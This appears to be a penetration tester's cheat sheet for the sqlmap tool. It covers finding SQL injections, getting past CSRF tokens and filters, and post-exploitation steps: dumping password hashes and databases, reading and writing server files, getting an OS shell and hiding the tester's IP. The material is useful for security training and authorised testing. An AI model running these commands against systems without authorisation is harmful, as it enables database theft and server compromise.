
### General Notes

Automated tool to test for [[SQL Injections]].
- Gets information about the Database and system being used.

> Data is saved in `/usr/share/sqlmap/output/sqlmap.test` for each URL used. Can use `--flush-session` to reset this data.

`SQLmap` performs automatic hash decryption using dictionary methods when it stumbles upon any value that resembles a hash format.

---
### Finding Injections

To properly obtain the URL as well as all the [[HTTP]] headers and [[Cookies]], we can copy the request from the network tab as [[cURL]]. It has the exact same format as `SQLmap`.

* To test a query parameter (`GET` [[HTTP]] parameter) :
```bash
sqlmap -u "/url?param=1&param2=2" --batch
sqlmap -u "/url?param=1&param2=2" -p param2
```
> The parameter we want to test should be placed in the URL, `param` in this case.
> `--batch` means don't ask for any user input and continue with default values.
> `-p` specifies which parameter we want to test.

* To test for `POST` requests:
```bash
sqlmap -u "/url" --data "param1=a"
sqlmap -u "/url" --data "data1=a*&data2=b"
sqlmap -u "/url" --data "data1=a&data2=b" -p data1
```
> Pass the parameters in the body using `--data`.
> If we know which parameter exactly we want to test, we can use the `*`, or the `-p` flag. 

* To run against a request saved in a text file:
```bash
sqlmap -r req.txt
```
> The `-r` flag specifies the path to the request file. We can use `*` inside the file to specify which parameter we want to test.
> This request file can be obtained from [[Burp Suite]] proxy.

#### Useful Flags

* To add a prefix and/or suffix to enclose all vectors being sent:
```bash
sqlmap -u "/url" --suffix="-- -" --prefix="' "
```
> This adds `' ` before all payloads and a `-- -` after all payloads.

* Send from random agents, instead of the sqlmap user agent:
```bash
--random-agent
```

* Imitate sending from a mobile phone:
```bash
--mobile
```

* Send using a specific [[HTTP#HTTP Verbs]]:
```bash
--method <VERB>
```

* Add an [[HTTP#HTTP Headers]]:
```bash
-H '<HEADER:VALUE>'
-A
--cookie 'name=value'
```
> Normal headers, user agent header, or [[Cookies]].
> They can all be specified using `-H` as well.

Adding the `*` in any of the above headers also tests for [[SQL Injections]] in them.

* Setting `level` and `risk` flags:
```bash
--level=5
--risk=3
```
> These are the maximum values, with both defaults at 1.
> Increasing these values tests more payloads, is slower, and can damage the database.

* Specify the number of columns in the table for `UNION` injection:
```bash
--union-cols=<num>
```

* Instead of `NULL` and random integer while testing for columns: 
```bash
--union-char='a'
```

* Specify the `FROM` table while doing `UNION` injection
```bash
--union-from=<table-name>
```

---

### Bypassing Web Application Protections

##### Bypassing Anti-[[Cross Site Request Forgery (CSRF)]]  

> To bypass this defense that makes it hard for automated tools to attack websites, the `--csrf-token` flag is passed. 

`SQLmap` tries to parse the target response and obtain a new token so that it can be used in the next request. Even if `--csrf-token` flag isn't present but one of the parameters or data being passed has a CSRF token, `SQLmap` will prompt the user to update this token for the remaining requests.

##### Bypassing Unique Value Requirements

- Some parameters need unique values in parameters. To achieve this so that each request sent has a different value for the parameter, the `--randomize` flag is used with the name of the parameter that should be randomized.
```bash
sqlmap -u "/url?param1=13" --randomize=param1
```

##### Calculated Parameters

- Some parameters that get passed are a result of some modification or calculation. This can be achieved by using the `--eval` flag and writing python code that calculates this parameter.
```bash
sqlmap -u "/url?p1=1&p2=2" --eval="p2=p1+1" 
```

Here the value of p2 is replaced by the calculation of p1 + 1. This can be used to hash parameters as well.   

#### Using Tamper Scripts

These can be used to tamper with the requests to bypass some defense mechanisms. These can be listed using the `--list-tampers` flag.

```bash
--tamper=<name1>,<name2>
```

---
### Post Exploitation

* Database enumeration:
```bash
--banner # gets the banner of the database.
--hostname # the hostname of the target.
--dbs # gets the databases.
--schema #structure of all tables in the databases.

--current-user # gets the current user.
--users # gets the current user in the db.
--is-dba # check if the current user is the database admin.
--passwords # prints the password hashes for the database users.

--dump -D <db-name> #prints everything there is in the database.
--dump-all #prints everything from all databases.
```

* Table enumeration after choosing a database:
```bash
-D <db-name> --tables #lists the tables in the database db-name.

-D <db-name> -T <table-name> --dump #prints everything in that table.
-D <db-name> -T <table-name> --columns #lists the columns in the table.

-D <db-name> -T <table-name> -C column-name,column-name --dump #gets the info of the columns
-D <db-name> -T <table-name> -C column-name,column-name --dump --start=2 --stop=4 #gets only columns in these rows.
```

* Searching for data:
```bash
-D <db-name> -T <table-name> -C column-name,column-name --dump --where="where clause without WHERE keyword" #get the rows only that meet certain conditions.

--search -T user #searches for tables containing the user keyword.
--search -C pass #searches for columns containing the pass keyword.
```
> For the `WHERE` clause example: `--where="username like '%mins%'"`

* Reading from files:
```bash
--file-read "/path/to/file"
```
> The file is then saved to a local file on the machine.

* Writing to files:
```bash
--file-write "/path/to/file/to/send" --file-dest "/where/to/save"
```

* To get a reverse shell:
```bash
--os-shell
```


---

### Test for Errors

* To display any database errors from the responses:
```bash
--parse-errors
```

* To store all the output to a file:
```bash
-t /path/to/file
```

* To be verbose and print everything:
```bash
-v 6
-v 3
```
> For verbosity of 3, it shows the payload that can be used in the browser.

* Use a proxy to redirect traffic:
```bash
--proxy "http://127.0.0.1:80"
```
> This uses [[Burp Suite]] as proxy.
> Can be used to conceal [[IP]] address. This can bypass some blocks.

---
